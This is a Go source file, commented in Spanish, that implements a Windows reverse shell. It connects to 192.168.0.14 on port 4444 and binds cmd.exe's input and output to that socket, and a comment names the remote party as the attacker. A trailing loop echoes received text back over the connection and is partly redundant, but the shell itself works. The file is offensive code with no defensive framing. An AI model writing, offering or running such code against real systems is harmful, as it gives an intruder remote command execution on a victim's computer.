package main

import (
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
)

func main() {
	c, err := net.Dial("tcp", "192.168.0.14:4444")
	if err != nil {
		panic(err)
	}
	defer c.Close()

	// Crear una sesión persistente de cmd.exe
	cmd := exec.Command("cmd")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c

	// Iniciar la sesión de cmd.exe
	go func() {
		err := cmd.Run()
		if err != nil {
			fmt.Println("Error al ejecutar la sesión de cmd:", err)
		}
	}()

	// Leer comandos desde el atacante y enviarlos a la sesión de cmd
	for {
		buffer := make([]byte, 1024)
		n, err := c.Read(buffer)
		if err != nil {
			if err == io.EOF {
				fmt.Println("Conexión cerrada")
				break
			}
			fmt.Println("Error al leer el comando:", err)
			continue
		}

		receivedCommand := strings.TrimSpace(string(buffer[:n]))
		fmt.Println("Comando recibido:", receivedCommand)

		// Escribir el comando en la sesión de cmd para ejecutarlo
		_, err = c.Write([]byte(receivedCommand + "\n"))
		if err != nil {
			fmt.Println("Error al enviar el comando a cmd:", err)
		}
	}
}
